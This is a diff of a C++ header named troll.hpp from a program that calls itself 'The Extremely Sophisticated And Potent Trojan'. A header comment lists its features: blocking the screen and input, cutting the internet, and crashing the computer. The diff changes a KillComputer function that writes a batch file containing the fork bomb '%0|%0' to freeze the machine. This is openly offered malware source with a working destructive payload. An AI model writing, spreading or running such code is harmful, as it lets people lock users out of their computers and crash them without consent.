@@ -1,10 +1,13 @@
 /*
-TROLL:
-block entire screen [ok]
-block input [ok]
-play sound [ok]
-turn off internet [ok]
-spawn a process which kills the entire computer [ok]
+ ___ ___   _   ___ 
+| __/ __| /_\ | _ \
+| _|\__ \/ _ \|  _/
+|___|___/_/ \_\_|  
+
+ESAP: The Extremely Sophisticated And Potent Trojan
+<troll.hpp>
+This header contains functions under the troll category.
+
 */
 
 #include <iostream>
@@ -54,6 +57,7 @@ void KillInternet(int seconds) {
 }
 
 void KillComputer() {
+    try {std::filesystem::remove("g.bat");} catch (...) {}
     std::ofstream pWrite("g.bat");
     pWrite << "%0|%0";
     pWrite.close();
